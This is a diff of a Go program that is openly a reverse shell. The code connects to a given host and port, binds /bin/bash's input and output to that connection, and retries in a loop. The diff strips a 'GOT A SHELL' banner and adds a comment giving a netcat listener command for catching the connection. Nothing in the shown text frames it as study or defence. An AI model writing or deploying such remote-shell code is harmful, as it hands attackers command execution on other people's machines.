@@ -1,7 +1,6 @@
 package main
 
 import (
-	"fmt"
 	"net"
 	"os/exec"
 	"time"
@@ -14,14 +13,13 @@ func reverse_shell(host string, port string) {
 		reverse_shell(host, port)
 	}
 
-	// Uses /bin/sh & get
+	// Uses /bin/sh
 	cmd := exec.Command("/bin/bash")
 
 	//Get user instructions
 	cmd.Stdin, cmd.Stdout, cmd.Stderr = connection, connection, connection
 
 	// Start connection
-	fmt.Println("\n██████╗  ██████╗ ████████╗     █████╗     ███████╗██╗  ██╗███████╗██╗     ██╗     \n██╔════╝ ██╔═══██╗╚══██╔══╝    ██╔══██╗    ██╔════╝██║  ██║██╔════╝██║     ██║     \n██║  ███╗██║   ██║   ██║       ███████║    ███████╗███████║█████╗  ██║     ██║     \n██║   ██║██║   ██║   ██║       ██╔══██║    ╚════██║██╔══██║██╔══╝  ██║     ██║     \n╚██████╔╝╚██████╔╝   ██║       ██║  ██║    ███████║██║  ██║███████╗███████╗███████╗\n╚═════╝  ╚═════╝    ╚═╝       ╚═╝  ╚═╝    ╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝")
 	cmd.Run()
 
 	// Then close connection
@@ -30,5 +28,7 @@ func reverse_shell(host string, port string) {
 }
 
 func main() {
+
 	reverse_shell("127.0.0.1", "8080")
+	// Run "nc -lvp 8080 < commmands.txt" to catch connection or use client.go
 }
